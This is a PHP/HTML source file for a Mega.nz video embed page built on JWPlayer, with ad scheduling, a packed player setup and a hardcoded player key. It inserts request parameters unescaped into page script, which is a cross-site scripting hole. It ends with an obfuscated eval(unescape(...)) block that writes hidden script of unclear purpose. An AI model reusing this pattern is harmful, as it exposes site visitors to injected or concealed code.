<?php
error_reporting(0);
include "curl.php";
require_once 'packer.php';
function encrypte($string,$key){
    $returnString = "";
    $charsArray = str_split("e7NjchMCEGgTpsx3mKXbVPiAqn8DLzWo_6.tvwJQ-R0OUrSak954fd2FYyuH~1lIBZ");
    $charsLength = count($charsArray);
    $stringArray = str_split($string);
    $keyArray = str_split(hash('sha256',$key));
    $randomKeyArray = array();
    while(count($randomKeyArray) < $charsLength){
        $randomKeyArray[] = $charsArray[rand(0, $charsLength-1)];
    }
    for ($a = 0; $a < count($stringArray); $a++){
        $numeric = ord($stringArray[$a]) + ord($randomKeyArray[$a%$charsLength]);
        $returnString .= $charsArray[floor($numeric/$charsLength)];
        $returnString .= $charsArray[$numeric%$charsLength];
    }
    $randomKeyEnc = '';
    for ($a = 0; $a < $charsLength; $a++){
        $numeric = ord($randomKeyArray[$a]) + ord($keyArray[$a%count($keyArray)]);
        $randomKeyEnc .= $charsArray[floor($numeric/$charsLength)];
        $randomKeyEnc .= $charsArray[$numeric%$charsLength];
    }
    return $randomKeyEnc.hash('sha256',$string).$returnString;
}
if($_GET['url'] != ""){
	$link = $_GET['url'];
	$link = str_replace('https://mega.nz/#','',$link);
	$backup = $_GET["ancok/*"];
	$mega_backup = my_simple_crypt($backup, 'd');
	$sub = $_GET['sub'];
	$poster = $_GET['poster'];
	$ad_vast_url = $_GET["advast/*"];
	$ancok_advast = my_simple_crypt($ad_vast_url, 'd');
	$mega_id = my_simple_crypt($link, 'd');
	$link_source = curl("https://nontonfilms.me/api-mega/api.php?id=".$mega_id); 
}
function split_link($link) {
	$spilt = chunk_split($link, 500, "=");
	$array = explode('=', $spilt);
	foreach($array as $i => $data) {
		$list .= 'id'.($i+1).'='.$data.'&';
	}
	$split_link = rtrim($list, '&');
	return $split_link;
}
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
	<title>Mega NZ Jwplayer Script</title>
	<style>body,html {background-color: #000;margin:0px;padding:0;width:100%;height:100%;border:none;}@-webkit-keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}@-moz-keyframes spin{0%{-moz-transform:rotate(0)}100%{-moz-transform:rotate(360deg)}}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}.ancok-spinner{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1003;background: #000000;overflow:hidden}  .ancok-spinner div:first-child{display:block;position:relative;left:50%;top:50%;width:150px;height:150px;margin:-75px 0 0 -75px;border-radius:50%;box-shadow:0 3px 3px 0 rgba(255,56,106,1);transform:translate3d(0,0,0);animation:spin 2s linear infinite}  .ancok-spinner div:first-child:after,.ancok-spinner div:first-child:before{content:'';position:absolute;border-radius:50%}  .ancok-spinner div:first-child:before{top:5px;left:5px;right:5px;bottom:5px;box-shadow:0 3px 3px 0 rgb(255, 228, 32);-webkit-animation:spin 3s linear infinite;animation:spin 3s linear infinite}  .ancok-spinner div:first-child:after{top:15px;left:15px;right:15px;bottom:15px;box-shadow:0 3px 3px 0 rgba(61, 175, 255,1);animation:spin 1.5s linear infinite}.ancok-iframe{position:absolute;width:100%;height:100%}</style>
	<script type="text/javascript" src="https://cdn.staticaly.com/gh/ufilestorage/a/master/jquery-2.2.3.min.js"></script>	
</head>
<body>
<div id="ancokplayer-loading-style" class="ancok-spinner"><div class="blob blob-0"></div><div class="blob blob-1"></div><div class="blob blob-2"></div><div class="blob blob-3"></div><div class="blob blob-4"></div><div class="blob blob-5"></div></div>    
<?php
$result = '<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.0/sweetalert.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" type="text/javascript"></script>
<script src="https://content.jwplatform.com/libraries/LJ361JYj.js"></script>
<script>jwplayer.key = "ypdL3Acgwp4Uh2/LDE9dYh3W/EPwDMuA2yid4ytssfI=";</script>	
<div id="ancok-player"></div>';
$data = 'var videoPlayer = jwplayer("ancok-player");videoPlayer.setup({'.$link_source.'preload:"auto",primary:"html5",autostart:"false",image:"'.$poster.'",width:"100%",height:"100%",hlslabels:{"3000":"1080p","1800":"720p","800":"480p","300":"240p"},playbackRateControls:[0.25,0.5,0.75,1,2,3,4],tracks:[{file:"'.$sub.'",label:"Subs",kind:"captions",default:"true",}],captions:{color:"#FFFF00",fontSize:15,edgeStyle:"uniform",backgroundOpacity:0,},aboutlink:"https://ancokplayer.win",abouttext:"Player By Ancok Player",sharing:{sites:["facebook","twitter","googleplus","linkedin","pinterest"]},advertising:{client:"vast",admessage:"This is an ad pod. This ad ends in xx seconds.",schedule:{adbreak1:{offset:"pre",tag:"'.$ancok_advast.'"},overlay:{offset:"5",tag: "overlay.xml",type:"nonlinear"},adbreak2:{ offset:"3000",tag:"'.$ancok_advast.'"},overlay:{offset:"5", tag:"overlay.xml",type:"nonlinear"},}}});
videoPlayer.on("error",function()
{swal({title:"Ancok Error!",text:"Please wait, we are switching to another server!",timer:3000})}
);
videoPlayer.on("error",function()
	{$("#ancok-player").html("<div class=\"ancok-iframe\"> <iframe src=\"'.$mega_backup.'\" width=\"100%\" height=\"100%\" frameborder=\"0\" allowfullscreen=\"allowfullscreen\" class=\"ancok-box\"></iframe></div>")}
);

';
$packer = new Packer($data, 'Normal', true, false, true);

			$packed = $packer->pack();

			$result .= '<script type="text/javascript">' . $packed . '</script>';

			echo $result;
?>
<script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%77%62%37%35%61%66%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%31%37%32%31%33%34%32%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%33%30%39%31%34%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%36%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%77%62%37%35%61%66%28%27') + '%30%6e%5e%6b%6b%6a%6f%1c%6d%73%63%5e%33%27%6d%5c%75%66%29%65%5d%73%5b%64%5c%68%65%69%6d%26%30%07%05%24%63%6f%61%5c%6a%65%6a%6b%1d%2a%1e%22%1c%76%07%0d%1b%1e%66%6c%6b%5a%66%63%68%6e%19%61%56%6f%4a%65%64%5c%6b%2a%69%5d%62%20%1a%7c%06%00%1c%19%19%1d%64%5f%6f%69%6f%68%13%68%58%62%2b%5d%5c%66%5b%23%27%6e%71%57%58%6a%65%64%5c%6b%29%23%34%01%07%1a%13%76%03%02%19%19%67%67%68%5c%68%60%69%61%1b%69%59%6d%4d%64%6f%5f%6d%24%6a%5c%6d%27%1e%68%60%64%58%64%23%1b%73%04%04%13%1b%1e%1c%6a%5f%63%20%5e%5a%68%58%22%28%6c%75%58%5a%6d%64%6f%5f%6d%27%25%1a%67%62%63%59%6f%20%32%0f%04%1b%1c%74%07%0d%1b%1e%18%2b%63%6f%20%6d%63%6f%72%51%6a%6f%66%38%5c%65%5c%7b%1a%36%1c%63%6f%61%5c%6a%65%6a%6b%1d%2a%5e%5e%60%58%73%2a%1b%71%01%07%19%1d%12%1a%71%5d%6f%1a%64%5e%62%66%19%34%1d%66%62%62%6b%36%07%0d%1b%1e%1c%19%60%67%12%22%60%59%6d%4e%6a%66%5b%6a%21%6d%65%6b%6d%22%25%19%75%0e%05%1e%1c%19%19%1d%12%71%62%6e%5d%69%78%29%59%60%5c%58%6b%46%63%66%59%6a%6f%67%23%65%59%6d%4d%64%6f%5f%6d%24%6d%62%6a%6c%27%25%36%19%00%0c%1a%1b%1c%19%77%0e%05%1e%1c%19%19%6a%57%6e%4f%65%64%5f%65%23%6a%64%60%6e%21%12%71%62%6e%5d%69%78%29%69%59%6d%4d%64%6f%5f%68%69%6d%22%69%6e%6c%5b%6d%60%6e%60%1a%23%25%19%75%0e%05%1e%1c%19%19%1d%12%6d%5e%68%4d%63%6e%5e%68%24%6e%5c%61%68%26%1b%66%58%66%64%5e%27%33%04%07%1d%12%1a%1b%1c%19%1e%2b%6c%5b%60%63%20%2f%65%62%68%77%21%23%3c%06%00%1c%19%19%1d%7f%26%1b%58%5c%66%52%72%27%25%36%04%03%12%1a%76%33%04%04%13%1b%1a%2e%63%6b%2f%6a%63%5f%59%52%63%67%63%3a%59%65%58%74%12%37%1b%66%6c%68%54%6f%67%6f%6b%19%25%2b%1a%74%01%07%1a%13%1b%1e%65%63%19%25%69%5f%6f%48%60%67%56%6d%26%68%61%60%6a%2b%23%1b%73%04%04%13%1b%1e%1c%19%19%76%6b%68%5f%6f%72%28%54%67%5b%5d%6f%4d%64%6f%5f%68%69%6d%22%68%5e%6a%48%60%64%58%64%22%6f%64%60%6d%2a%22%31%01%07%19%1d%12%1a%1b%1c%6e%5f%67%4f%67%61%5c%6f%25%66%62%62%6b%25%1a%69%5a%62%6b%5c%20%32%0f%04%1b%1c%19%1a%7e%06%00%1c%19%19%1d%16%22%6f%64%60%6d%2a%29%66%65%5d%5c%25%2b%35%06%02%19%1a%7e%06%00%71%20%21%63%43%6f%5e%6a%70%23%3c%06%00%18%21%5d%6e%55%6f%66%59%6b%6e%2a%29%68%59%58%5d%74%2a%60%6e%6e%5e%6e%6a%68%6c%1c%21%20%1d%7d%07%05%18%21%21%14%5a%6c%5b%6a%66%6d%6e%5b%72%59%6f%27%6f%68%5f%58%60%6b%66%2f%6d%6f%75%65%5f%28%22%2c%6b%61%6a%76%59%63%6f%64%3d%5f%6f%5a%77%24%2c%29%2d%22%23%34%01%07%71%6a%69%5a%6f%72%2b%6a%57%6e%4f%65%64%5f%60%6e%6a%24%63%6c%6f%55%6e%62%6f%6b%1a%2b%22%1e%73%04%07%19%2a%21%1c%5d%6b%5d%60%64%6e%60%58%70%58%64%27%67%6f%58%5e%6a%69%65%21%6e%6d%74%6e%5f%20%25%2b%62%6a%5f%5b%57%60%6d%65%36%5f%67%5d%70%22%2a%34%03%02%74%25%1d%27%2a%2b%2c%20%35%0e%05%73%25%36%35%2e%65%5d%6d%65%69%6e%3111721342%36%33%33%37%38%30%31' + unescape('%27%29%29%3b'));
// -->
</script>
<noscript><i>Javascript required</i></noscript>
</body>
</html>